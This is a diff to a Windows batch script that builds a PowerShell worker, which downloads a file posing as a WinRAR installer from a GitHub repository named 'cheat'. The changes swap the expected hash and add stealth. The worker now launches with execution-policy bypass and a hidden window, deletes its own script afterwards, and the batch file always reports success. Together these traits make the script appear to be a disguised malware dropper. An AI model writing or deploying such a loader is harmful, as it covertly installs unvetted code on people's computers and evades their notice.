@@ -2,7 +2,7 @@
 setlocal EnableExtensions
 
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
-set "HASH=c746372b0a52a457c0350669874b297d33b9f3b783ba7a7434933fc7d229504e"
+set "HASH=015e2e6a6f81dbf422fe5751016c96305a6b271b069fcd56f0c8bd5b93f6271e"
 set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"
 set "PS_SCRIPT=%TEMP%\winrar_worker_%RANDOM%.ps1"
 set "LOG=%TEMP%\winrar_worker.log"
@@ -14,6 +14,7 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo $h = $env:HASH.ToLowerInvariant^(^)
   echo $f = $env:OUT
   echo $log = $env:LOG
+  echo $psFile = $PSCommandPath
   echo.
   echo function Write-Log([string]$Msg^) {
   echo     $line = "[{0}] {1}" -f ^(Get-Date -Format 'HH:mm:ss'^), $Msg
@@ -21,7 +22,7 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo }
   echo.
   echo try {
-  echo     Write-Log "Start worker. URL=$u"
+  echo     Write-Log "Start hidden worker. URL=$u"
   echo     if ^(Test-Path -LiteralPath $f^) { Remove-Item -LiteralPath $f -Force }
   echo.
   echo     $downloaded = $false
@@ -69,15 +70,18 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo     if ^(Test-Path -LiteralPath $f^) {
   echo         Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
   echo     }
-  echo     if ^(Test-Path -LiteralPath $PS_SCRIPT^) {
-  echo         Remove-Item -LiteralPath $PS_SCRIPT -Force -ErrorAction SilentlyContinue
+  echo     if ^($psFile -and ^(Test-Path -LiteralPath $psFile^)^) {
+  echo         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
   echo     }
   echo }
 )
 
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%PS_SCRIPT%"
-set "EXIT_CODE=%ERRORLEVEL%"
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+  "$psi = New-Object System.Diagnostics.ProcessStartInfo; " ^
+  "$psi.FileName = 'powershell.exe'; " ^
+  "$psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $env:PS_SCRIPT + '\"'; " ^
+  "$psi.UseShellExecute = $false; " ^
+  "$psi.CreateNoWindow = $true; " ^
+  "[System.Diagnostics.Process]::Start($psi) | Out-Null"
 
-if exist "%PS_SCRIPT%" del /f /q "%PS_SCRIPT%" >nul 2>&1
-
-endlocal & exit /b %EXIT_CODE%
+exit /b 0
